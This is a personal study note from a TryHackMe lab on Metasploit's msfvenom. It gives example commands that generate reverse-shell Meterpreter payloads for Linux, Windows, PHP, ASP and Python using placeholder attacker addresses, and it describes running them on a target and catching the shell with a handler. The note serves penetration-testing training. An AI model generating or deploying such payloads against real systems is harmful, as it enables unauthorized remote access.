---
Main Topic: Exploitation_Basics
Sub Topic: Metasploit___Msfvenom
Links:
  - https://tryhackme.com/room/metasploitexploitation?taskNo=6&sharerId=6702abe0f77a70c90629f7db
Date: 07-01-2026
Related Notes:
  - "[[Metasploit___Scanning]]"
  - "[[Metasploit___Exploit]]"
  - "[[Metasploit___Introduction]]"
Tags:
  - topic
  - research
  - notes
  - Exploitation
  - Tools
  - THM
---

# Metasploit___Msfvenom


> [!INFO] Msfvenom
> Msfvenom, which replaced **Msfpayload** and **Msfencode**, allows you to generate payloads.
> 
> Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

![[Pasted image 20260107233421.png|1275]]

---

## Some examples

#THM 
In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  
  
Linux Executable and Linkable Format (elf)  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  
  
Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  

> [!NOTE] About PHP
> The output PHP file will miss the starting PHP tag commented and the end tag (`?>`).
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`  
  
All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.
